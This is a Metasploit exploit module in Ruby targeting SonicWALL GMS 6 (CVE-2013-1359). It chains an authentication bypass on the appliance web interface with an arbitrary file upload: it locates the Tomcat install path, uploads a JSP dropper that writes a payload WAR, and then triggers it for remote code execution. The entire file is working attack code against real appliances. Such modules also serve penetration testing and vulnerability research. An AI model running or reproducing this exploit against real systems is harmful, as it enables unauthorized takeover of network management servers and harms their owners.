##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

load 'lib/msf/core/payload/java.rb'
load 'lib/msf/core/encoded_payload.rb'
load 'lib/msf/util/exe.rb'
require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = ExcellentRanking

	HttpFingerprint = { :pattern => [ /Apache-Coyote/ ] }

	include Msf::Exploit::Remote::HttpClient
	include Msf::Exploit::EXE
	include Msf::Exploit::FileDropper

	def initialize(info = {})
		super(update_info(info,
			'Name'        => 'SonicWALL GMS 6 Arbitrary File Upload',
			'Description' => %q{
					This module exploits a code execution flaw in SonicWALL GMS. It exploits two
				vulnerabilities in order to get its objective. An authentication bypass in the
				Web Administration interface allows to abuse the "appliance" application and upload
				an arbitrary payload embedded in a JSP. The module has been tested successfully on
				SonicWALL GMS 6.0.6017 over Windows 2003 SP2 and SonicWALL GMS 6.0.6022 Virtual
				Appliance (Linux). On the Virtual Appliance the linux meterpreter hasn't run
				successfully while testing, shell payload have been used.
			},
			'Author'       =>
				[
					'Nikolas Sotiriu', # Vulnerability Discovery
					'Julian Vilas <julian.vilas[at]gmail.com>', # Metasploit module
					'juan vazquez' # Metasploit module
				],
			'License'     => MSF_LICENSE,
			'References'  =>
				[
					[ 'CVE', '2013-1359'],
					[ 'OSVDB', '89347' ],
					[ 'BID', '57445' ],
					[ 'EDB', '24204' ]
				],
			'Privileged'  => true,
			'Platform'    => [ 'win', 'linux' ],
			'Targets'     =>
				[
					[ 'SonicWALL GMS 6.0 Viewpoint / Java Universal',
						{
							'Arch' => ARCH_JAVA,
							'Platform' => 'java'
						}
					],
					[ 'SonicWALL GMS 6.0 Viewpoint / Windows 2003 SP2',
						{
							'Arch' => ARCH_X86,
							'Platform' => 'win'
						}
					],
					[ 'SonicWALL GMS Viewpoint 6.0 Virtual Appliance (Linux)',
						{
							'Arch' => ARCH_X86,
							'Platform' => 'linux'
						}
					]
				],
			'DefaultTarget'  => 0,
			'DisclosureDate' => 'Jan 17 2012'))

		register_options(
			[
				Opt::RPORT(80),
				OptString.new('TARGETURI', [true, 'Path to SonicWall GMS', '/'])
			], self.class)
	end


	def get_install_path
		res = send_request_cgi(
			{
				'uri'    => "#{@uri}appliance/applianceMainPage?skipSessionCheck=1",
				'method' => 'POST',
				'connection' => 'TE, close',
				'headers' =>
					{
						'TE' => "deflate,gzip;q=0.3",
					},
				'vars_post' => {
					'num' => '123456',
					'action' => 'show_diagnostics',
					'task' => 'search',
					'item' => 'application_log',
					'criteria' => '*.*',
					'width' => '500'
				}
			})

		if res and res.code == 200 and res.body =~ /VALUE="(.*)logs/
			return $1
		end

		return nil
	end

	def upload_file(location, filename, contents)
		post_data = Rex::MIME::Message.new
		post_data.add_part("file_system", nil, nil, "form-data; name=\"action\"")
		post_data.add_part("uploadFile", nil, nil, "form-data; name=\"task\"")
		post_data.add_part(location, nil, nil, "form-data; name=\"searchFolder\"")
		post_data.add_part(contents, "application/octet-stream", nil, "form-data; name=\"uploadFilename\"; filename=\"#{filename}\"")

		data = post_data.to_s
		data.gsub!(/\r\n\r\n--_Part/, "\r\n--_Part")

		res = send_request_cgi(
			{
				'uri'    => "#{@uri}appliance/applianceMainPage?skipSessionCheck=1",
				'method' => 'POST',
				'data'   => data,
				'ctype'  => "multipart/form-data; boundary=#{post_data.bound}",
				'headers' =>
					{
						'TE' => "deflate,gzip;q=0.3",
					},
				'connection' => 'TE, close'
			})
		if target['Platform'] == "win"
			register_files_for_cleanup("#{location}\\#{filename}")
		else
			register_files_for_cleanup("#{location}/#{filename}")
		end

		if res and res.code == 200 and res.body.empty?
			return true
		else
			return false
		end
	end

	def check
		@peer = "#{rhost}:#{rport}"
		@uri = normalize_uri(target_uri.path)
		@uri << '/' if @uri[-1,1] != '/'

		if get_install_path.nil?
			return Exploit::CheckCode::Safe
		end

		return Exploit::CheckCode::Vulnerable
	end

	def exploit
		@peer = "#{rhost}:#{rport}"
		@uri = normalize_uri(target_uri.path)
		@uri << '/' if @uri[-1,1] != '/'

		# Get Tomcat installation path
		print_status("#{@peer} - Retrieving Tomcat installation path...")
		install_path = get_install_path

		if install_path.nil?
			fail_with(Exploit::Failure::NotVulnerable, "#{@peer} - Unable to retrieve the Tomcat installation path")
		end

		print_good("#{@peer} - Tomcat installed on #{install_path}")

		if target['Platform'] == "linux"
			@location = "#{install_path}webapps/appliance/"
		elsif target['Platform'] == "win"
			@location = "#{install_path}webapps\\appliance\\"
		end

		# Generate the WAR containing the EXE containing the payload
		jsp_name = "index"
		app_base = rand_text_alphanumeric(4+rand(32-4))

		war = payload.encoded_war({
				:app_name => app_base,
				:jsp_name => jsp_name,
				:arch => target.arch,
				:platform => target.platform
			}).to_s
		File.open("foo.war", "wb") { |fd| fd.write(war) }

		dropper = jsp_bin_dropper(war, "#{install_path}webapps/foo.war")
		upload_file("#{install_path}webapps/appliance", "foo-dropper.jsp", dropper)
		send_request_cgi(
			{
				'uri'    => normalize_uri("#{@uri}appliance/foo-dropper.jsp"),
				'method' => 'GET'
			})

		send_request_cgi(
			{
				'uri'    => normalize_uri("#{target_uri.path}/foo/#{app_base}/#{jsp_name}.jsp"),
				'method' => 'GET'
			})
	end

	def jsp_bin_dropper(bin_data, output_file)
		jspraw =  %Q|<%@ page import="java.io.*" %>\n|
		jspraw << %Q|<%\n|
		jspraw << %Q|String data = "#{Rex::Text.to_hex(bin_data, "")}";\n|

		jspraw << %Q|FileOutputStream outputstream = new FileOutputStream("#{output_file}");\n|

		jspraw << %Q|int numbytes = data.length();\n|

		jspraw << %Q|byte[] bytes = new byte[numbytes/2];\n|
		jspraw << %Q|for (int counter = 0; counter < numbytes; counter += 2)\n|
		jspraw << %Q|{\n|
		jspraw << %Q|  char char1 = (char) data.charAt(counter);\n|
		jspraw << %Q|  char char2 = (char) data.charAt(counter + 1);\n|
		jspraw << %Q|  int comb = Character.digit(char1, 16) & 0xff;\n|
		jspraw << %Q|  comb <<= 4;\n|
		jspraw << %Q|  comb += Character.digit(char2, 16) & 0xff;\n|
		jspraw << %Q|  bytes[counter/2] = (byte)comb;\n|
		jspraw << %Q|}\n|

		jspraw << %Q|outputstream.write(bytes);\n|
		jspraw << %Q|outputstream.close();\n|

		jspraw << %Q|%>\n|
		return jspraw
	end

end
